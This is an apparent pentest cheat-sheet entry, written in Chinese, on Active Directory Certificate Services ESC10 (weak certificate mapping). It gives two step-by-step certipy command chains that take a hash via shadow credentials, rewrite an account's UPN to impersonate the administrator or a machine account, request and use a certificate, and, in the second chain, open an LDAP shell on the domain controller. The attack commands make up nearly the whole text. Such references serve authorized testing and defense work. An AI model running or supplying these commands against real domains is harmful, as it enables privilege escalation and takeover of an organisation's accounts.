# Active Directory - 证书 ESC10

## ESC10 – 弱证书映射 - StrongCertificateBindingEnforcement

**前提条件**：

* `StrongCertificateBindingEnforcement` = 0。

**利用方法**：

```ps1
# 使用影子凭据获取用户哈希
certipy shadow auto -username "user@domain.local" -p "password" -account admin -dc-ip 10.10.10.10

# 更改用户 UPN
certipy account update -username "user@domain.local" -p "password" -user admin -upn administrator -dc-ip 10.10.10.10

# 请求证书
certipy req -username "admin@domain.local" -hashes "hashes" -target "10.10.10.10" -ca 'DOMAIN-CA' -template 'user' -debug

# 回滚 UPN 修改
certipy account update -username "user@domain.local" -p "password" -user admin -upn admin -dc-ip 10.10.10.10

# 使用证书连接
certipy auth -pfx 'administrator.pfx' -domain "domain.local" -dc-ip 10.10.10.10
```

## ESC10 – 弱证书映射 - CertificateMappingMethods

**前提条件**：

* `CertificateMappingMethods` = 0x04。

**利用方法**：

```ps1
certipy shadow auto -username "user@domain.local" -p "password" -account admin -dc-ip 10.10.10.10

# 将用户 UPN 更改为 computer$
certipy account update -username "user@domain.local" -p "password" -user admin -upn 'computer$@domain.local' -dc-ip 10.10.10.10

# 请求证书
certipy req -username "admin@domain.local" -hashes "3b60abbc25770511334b3829866b08f1" -target "10.10.10.10" -ca 'DOMAIN-CA' -template 'user' -debug

# 回滚 UPN 修改
certipy account update -username "user@domain.local" -p "password" -user admin -upn admin -dc-ip 10.10.10.10

# 通过 schannel 使用证书连接
certipy auth -pfx 'computer.pfx' -domain "domain.local" -dc-ip 10.10.10.10 -ldap-shell
```

## 参考资料

* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)
